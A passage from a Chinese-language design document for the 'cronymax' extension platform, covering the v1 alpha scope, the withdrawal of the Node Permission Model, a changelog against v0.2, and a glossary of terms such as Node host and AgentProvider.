| R5 · L1 API 设计错 | Phase 0 freeze IDL + peer review | Phase 0 末 |
| R6 · flow runtime 现有 agent step 耦合 | Phase 0 摸底；Phase 8 重构 | Phase 0 末 |
| R7 · 内置 LLM provider 迁移 | v1 不迁；M1 评估 | 已决 |
| R8 · v1 无 marketplace 审核 | v1 仅本地 .crx；用户群可控 | M1 上 marketplace |

---

## 15. M0 范围（v1 alpha）

### 必须

- L1 Kernel 14 原语
- L1.5 平台事件 8 条入门
- L2 EP 6 个（command / config.schema / config.page / agents.provider / content.renderer / ui.sidebar.view）
- **Node 26 打包**（macOS arm64/x64 + Win x64 + Linux x64）
- **Node host 进程池 + 每扩展独立 host**
- **build_node_flags：manifest → Node Permission flags**（含平台变量展开 + canonicalize）
- **RPC 走 inherited fd 3**（不走 Unix socket / Named Pipe；详见 §6.1.1）
- Webview 沙箱 iframe
- 安装期人话授权 UX（all-or-nothing + post-install 单项撤销）
- `@cronymax/extension` TS SDK + IDL codegen
- `cronymax ext` CLI
- 设置面板 - Extensions 标签
- **`bytedance.coco` 内置 dogfood**
- **flows agent 系统适配 AgentProvider**
- 第二个 dogfood（推荐 `acme.mermaid-renderer`）
- **扩展日志系统**：4 类 log 文件 + `createOutputChannel` SDK + 设置面板"日志" tab + `diagnostic-bundle` CLI + 6 层 EH 错误处理（详见 [`extension-logs.md`](extension-logs.md)）

### 不在 v1（推 M1+）

- OS sandbox 外层（γ）
- Marketplace + 数字签名
- 远程开发模式
- 共享 Node host / 池预热
- Process runtime（非 JS 扩展）
- 正式 L3 服务 registry
- WASM runtime
- 其余 L2 EPs
- inline content renderers
- 内置 LLM provider 迁移
- ESM 主推
- 跨扩展依赖图 UI

---

## 16. 跟 v0.2 的差异速查

> **v1-alpha 修订**：这张表展示的是 v0.3 **原始**提案对 v0.2 的差异。v0.3 在 2026-05-20 自身又经历了一次大修订（撤回 Node Permission Model）—— 见本文档顶部 banner 和 [`permission-removal.md`](permission-removal.md)。下面"v0.3"列描述的是原始提案；**当前实际方案**见各章正文。

| 项 | v0.2 | v0.3 原始提案 | v0.3 v1-alpha 实际 |
|---|---|---|---|
| Node 版本 | Node 22 LTS | Node 26 | Node 26（仅作为 runtime 基线，不依赖 Permission Model） |
| 网络 ACL | "manifest 信息披露不强制" | Node `--allow-net` boolean | **不 gate**；扩展直接用 Node fetch / net |
| child_process 平台 wrap | "command + argsPattern 白名单" | 纯 Node `--allow-child-process` boolean | **不 gate**；扩展直接用 `node:child_process` |
| 网络包装层 | "M1 bootstrap 包装 net/tls/http" | 砍掉 | 同 |
| 审计 hook | "bootstrap 记 spawn 日志" | audit.log 结构化 | **撤回**；只保留 host.log / output.log 操作日志 |
| FFI / inspector / addons | 未控 | `--allow-ffi/-inspector/-addons` 默认禁 | **不 gate** |
| manifest capabilities | `process: { allow: [...] }` 复杂结构 | `[{path, mode}]` + 平台变量 | **撤回**；schema 接受但不解释 |
| α 安全实施工程量 | ~5 天 | ~3 天 | 撤回后净减码 ~1500 行 |
| IPC | Unix socket / Named Pipe | Inherited fd 3 | **保留** fd 3 |
| 扩展日志系统 | 未设计 | 入 v1 | **保留**（剥离 audit 框架后仍承担操作日志） |

## 16.1 Phase 0 评议引入的修订（v0.3 → v0.3-patched）

详见 [`phase-0-review.md`](phase-0-review.md) §6 决议汇总。要点：

| 项 | 改动 |
|---|---|
| §6.1 `build_node_flags` | 永远 emit `--no-warnings`；fs 改平台变量展开 + canonicalize 双填；network 改 boolean |
| §6.1.1 **新增** | RPC 走 inherited fd 3，不走 Unix socket |
| §6.1.2 **新增** | 平台变量集（`{WORKSPACE}` / `{HOME}` / `{EXT_STORAGE}` 等） |
| §6.2 安装期授权 | all-or-nothing + post-install 撤销；网络项标注"v1 不区分主机" |
| §6.4 防绕过表 | 网络一行改"v1 boolean，M1+ host-scoped" |
| §8 manifest schema | `fs` 改 `[{path, mode}]` 数组 + 平台变量 |
| §10 lifecycle | activate spawn 加 stdio fd 3 描述；crash 详转 `extension-logs.md` §7 |
| §13 决策 4c | IPC = inherited fd 3（替 Unix socket）|
| §13 决策 4d | 加 "bootstrap 极少量 hook 不算 require 劫持" 澄清 |
| §15 M0 范围 | 加扩展日志系统 / RPC fd 3 / 平台变量 |
| **新增** §16.1 | 本表 |
| 总 v1 alpha 估时 | 12-14 周 | **10-12 周** |

---

## 17. 附录 · 词汇

- **Kernel API** — `cronymax.*` namespace 暴露的能力 API
- **L2 EP** — Extension Point，平台 UI/逻辑消费的具名贡献槽位
- **AgentProvider** — 实现聊天会话能力的扩展接口
- **AgentSession** — 一次具体对话实例
- **Agent** — `.cronymax/agents/<id>.agent.yaml` 配置的 persona + provider 引用
- **Node host** — 跑扩展代码的 Node 26 子进程；每扩展独立
- **Node Permission Model** — Node 24+ 稳定的 VM 层 capability enforcement，Node 26 完整版含网络/FFI/Inspector
- **α 阶段** — v1：Node Permission 一条龙
- **γ 阶段** — M1：α + OS sandbox 双层

---

文档版本：v0.3 · 2026-05-19
DRI：待定
评审：待
